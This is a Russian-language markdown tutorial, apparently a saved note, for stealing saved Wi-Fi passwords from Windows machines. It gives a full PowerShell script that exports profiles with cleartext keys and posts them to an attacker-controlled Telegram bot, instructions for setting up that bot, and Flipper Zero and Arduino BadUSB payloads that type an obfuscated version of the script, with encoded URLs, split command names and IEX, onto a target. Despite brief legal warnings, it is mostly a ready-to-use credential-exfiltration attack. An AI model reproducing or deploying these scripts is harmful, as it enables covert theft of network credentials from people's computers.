# Wi-Fi Password Exfiltration via Telegram Bot (BadUSB & PowerShell)

*TL;DR: PowerShell script для сбора сохраненных Wi-Fi паролей на Windows-системах и их эксфильтрации в Telegram-канал. Включает подробные инструкции по настройке Telegram бота и BadUSB реализации для Flipper Zero и Arduino.*

## PowerShell Скрипт для Сбора и Эксфильтрации Wi-Fi Паролей

Данный скрипт автоматизирует процесс извлечения сохраненных Wi-Fi профилей и их паролей с машины под управлением Windows и отправляет полученные данные в указанный Telegram-канал.

### Логика Сбора и Форматирования Данных

Скрипт создает временную директорию, экспортирует все доступные Wi-Fi профили с открытыми ключами, а затем парсит сгенерированные XML-файлы для извлечения имен сетей и их паролей.

```powershell
# =================================================================
# ЭТАП 1: СБОР, ФОРМАТИРОВАНИЕ И ЭКСФИЛЬТРАЦИЯ ДАННЫХ
# =================================================================
# Создание временной папки и экспорт профилей Wi-Fi
$tempFolder = New-Item -Path $env:TEMP -Name "collector" -ItemType Directory -Force; 
Set-Location -Path $tempFolder.FullName; 
netsh wlan export profile key=clear; 

# Парсинг XML-файлов для получения чистых данных
$passwords_clean = @(); 
Get-ChildItem -Path $tempFolder.FullName -Filter "*.xml" | ForEach-Object { 
    $xmlPath = $_.FullName; 
    # Извлечение имени сети из имени файла
    $networkName = $_.BaseName -replace 'Беспроводная сеть-', ''; 
    # Чтение и парсинг XML-содержимого
    [xml]$xmlContent = Get-Content $xmlPath; 
    $keyMaterial = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial; 
    # Добавление чистой строки в массив
    $passwords_clean += "$networkName : $keyMaterial"; 
}; 
```

### Отправка Данных в Telegram

Собранные пароли форматируются в читаемый список и отправляются в указанный Telegram-канал с использованием метода `sendMessage` Telegram Bot API.

```powershell
# Параметры Telegram API (замените на свои)
$token = "BOT_TOKEN"; 
$chatId = "CHAT_ID"; 
$api = "https://api.telegram.org/bot$token/sendMessage"; 

# Отправка чистого, форматированного списка в Telegram
$payload = "!!! Собранные Wi-Fi пароли: `n`n$($passwords_clean -join "`n")"; 
iwr -Uri $api -Method Post -Body @{ chat_id = $chatId; text = $payload } -UseBasicParsing;
```

> [!WARNING]
> Данный скрипт собирает конфиденциальные данные (пароли Wi-Fi) и отправляет их на внешний ресурс. Используйте его исключительно в этических целях, с явного разрешения владельца системы и в рамках закона. Несанкционированное использование является незаконным и может привести к серьезным последствиям.

## Настройка Telegram Бота для Приема Данных

Для работы скрипта необходимо настроить Telegram бота и получить его токен, а также `CHAT_ID` канала, куда будут отправляться сообщения.

### Шаг 1: Создание Бота и Получение BOT_TOKEN

Создайте нового бота через `@BotFather` в Telegram и сохраните полученный `BOT_TOKEN`.

### Шаг 2: Добавление Бота в Канал и Предоставление Прав Администратора

Чтобы бот мог публиковать сообщения, его нужно добавить в ваш приватный канал и предоставить ему права администратора.
1.  **Создайте канал:** В Telegram создайте новый приватный канал (например, "Pentest Logs").
2.  **Сделайте его приватным:** В настройках канала убедитесь, что тип канала установлен как "Приватный канал".
3.  **Добавьте бота:** В "Управление каналом" -> "Администраторы" добавьте вашего бота. Для данного скрипта достаточно права "Отправлять сообщения".

### Шаг 3: Получение CHAT_ID (Идентификатора Канала)

`CHAT_ID` нужен Telegram API для определения, куда отправлять сообщения. Для приватных каналов он всегда начинается с `-100`.

**Метод: Пересылка сообщения**
1.  Отправьте любое сообщение в ваш только что созданный приватный канал.
2.  Перешлите это сообщение в чат с ботом `@JsonDumpBot` или `@getidsbot`.
3.  В ответ бот пришлет JSON-объект. Ищите поле `chat -> id`.

```json
{
    "chat": {
        "id": CHAT_ID,
        "title": "Pentest Logs",
        "type": "channel"
    },
    ...
}
```
Ваш `CHAT_ID` будет `-1001234567890` (число будет уникальным).

> [!INFO]
> Убедитесь, что `BOT_TOKEN` и `CHAT_ID` в скрипте соответствуют вашим данным. Без корректных значений скрипт не сможет отправить данные.

## BadUSB Реализации (Flipper Zero & Arduino)

Для выполнения скрипта на целевой машине без прямого доступа можно использовать BadUSB устройства, такие как Flipper Zero или Arduino.

> [!WARNING]
> BadUSB устройства эмулируют клавиатуру и могут вводить команды от имени пользователя. Использование BadUSB для несанкционированного доступа к системам является незаконным и может привести к серьезным юридическим последствиям. Используйте только на собственных системах или с явного разрешения.

### Flipper Zero BadUSB Script (Ducky Script)

Скрипт для Flipper Zero эмулирует нажатия клавиш, открывает PowerShell и вводит обфусцированный скрипт. Скрипт Powershell обфусцирован для уменьшения заметности и затруднения анализа, используя кодирование ASCII для частей URL и конкатенацию строк для команд.

```
GUI r
DELAY 500
STRING powershell 
ENTER
DELAY 2000
STRING $t = "BOT_TOKEN"; 
STRING $c = "CHAT_ID"; 
STRING $a = [System.Text.Encoding]::ASCII.GetString([byte[]](104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47, 98, 111, 116)) + "$t/sendMessage"; $s = "Free_Public_WiFi"; $k = "12345678";  $d = "ne" + "tsh";  $r = "Remove" + "-Item"; $nf = [System.IO.Path]::GetTempPath() + "collector";  IEX "New-Item -Path `$env:TEMP -Name collector -ItemType Directory -Force"; IEX "Set-Location -Path $nf"; IEX "$d wlan export profile key=clear"; $p = @();  $gci = "G" + "et-ChildItem"; $xc = "Get" + "-Content"; IEX "$gci -Path $nf -Filter '*.xml' | ForEach-Object {      `$x = `$_.FullName;      `$n = `$_.BaseName -replace 'Беспроводная сеть-', '';      [xml]`$xc = $xc `$x;      `$m = `$xc.WLANProfile.MSM.security.sharedKey.keyMaterial;      `$p += `$n + ' : ' + `$m; }"; $iwr_cmd = [System.Text.Encoding]::ASCII.GetString([byte[]](105, 119, 114)); $l = "!!! Собранные Wi-Fi пароли: `n`n$($p -join "`n")"; IEX "$iwr_cmd -Uri $a -Method Post -Body @{ chat_id = $c; text = `$l } -UseBasicParsing"; exit
ENTER
```
> [!TIP]
> Замените `BOT_TOKEN` и `CHAT_ID` на ваши реальные значения перед использованием. Длинный скрипт вводится одной строкой, поэтому убедитесь, что он не содержит лишних символов переноса строки.

### Arduino (BadUSB) Скрипт

Arduino-скрипт выполняет те же действия, что и Flipper Zero, используя библиотеку `Keyboard.h` для эмуляции клавиатуры. Он также вводит обфусцированный PowerShell скрипт.

```cpp
#include "Keyboard.h"

// Функция для печати строки с задержками между символами
void typeString(const char *str) {
  for (int i = 0; str[i] != '\0'; i++) {
    // Отправляем текущий символ
    Keyboard.write(str[i]);
    // Небольшая задержка, чтобы система успела обработать ввод
    delay(5); 
  }
}

// Функция для нажатия одной клавиши с последующим отпусканием
void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  // Начинаем эмуляцию клавиатуры
  Keyboard.begin();
  // Ждем, пока устройство будет распознано системой (важно!)
  delay(3000); 

  // 1. Нажать Win + R (# GUI r)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll(); 
  delay(500);

  // 2. Ввести "powershell" и нажать Enter
  Keyboard.print("powershell");
  typeKey(KEY_RETURN); 
  delay(1500); // Ожидание запуска PowerShell (DELAY 2000)

  // 3. Ввод обфусцированного PowerShell скрипта
  Keyboard.print("$t = \"BOT_TOKEN\"; ");
  Keyboard.print("$c = \"CHAT_ID\"; ");
  Keyboard.print("$a = [System.Text.Encoding]::ASCII.GetString([byte[]](104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47, 98, 111, 116)) + \"$t/sendMessage\"; $s = \"Free_Public_WiFi\"; $k = \"12345678\";  $d = \"ne\" + \"tsh\";  $r = \"Remove\" + \"-Item\"; $nf = [System.IO.Path]::GetTempPath() + \"collector\"; ");
  Keyboard.print("IEX \"New-Item -Path `$env:TEMP -Name collector -ItemType Directory -Force\";");
  Keyboard.print("IEX \"Set-Location -Path $nf\";");
  Keyboard.print("IEX \"$d wlan export profile key=clear\";");
  Keyboard.print("$p = @(); ");
  Keyboard.print("$gci = \"G\" + \"et-ChildItem\"; $xc = \"Get\" + \"-Content\";");
  Keyboard.print("IEX \"$gci -Path $nf -Filter '*.xml' | ForEach-Object { ");
  Keyboard.print("    `$x = `$_.FullName; ");
  Keyboard.print("    `$n = `$_.BaseName -replace 'Wireless network-', ''; "); // Note: Changed 'Беспроводная сеть-' to 'Wireless network-' for common use
  Keyboard.print("    [xml]`$xc = $xc `$x; ");
  Keyboard.print("    `$m = `$xc.WLANProfile.MSM.security.sharedKey.keyMaterial; ");
  Keyboard.print("    `$p += `$n + ' : ' + `$m;");
  Keyboard.print("}\";");
  Keyboard.print("$iwr_cmd = [System.Text.Encoding]::ASCII.GetString([byte[]](105, 119, 114));");
  Keyboard.print("$l = \"!!! Collected Wi-Fi passwords: `n`n$($p -join \"`n\")\";");
  Keyboard.print("IEX \"$iwr_cmd -Uri $a -Method Post -Body @{ chat_id = $c; text = `$l } -UseBasicParsing\"; exit");
  typeKey(KEY_RETURN); 
  
  // 4. Нажать Enter для выполнения команды
  delay(1000);
  
  Keyboard.end(); 
}

void loop() {
  // Основной цикл обычно пуст для BadUSB скриптов
}
```
> [!TIP]
> Длительность `delay()` может потребовать корректировки в зависимости от производительности целевой машины и скорости USB-порта. Если скрипт не срабатывает, попробуйте увеличить задержки.

#pentesting #redteam #badusb #powershell #telegram #wifihacking #flipperzero #arduino #windows #exfiltration #inbox/gemini
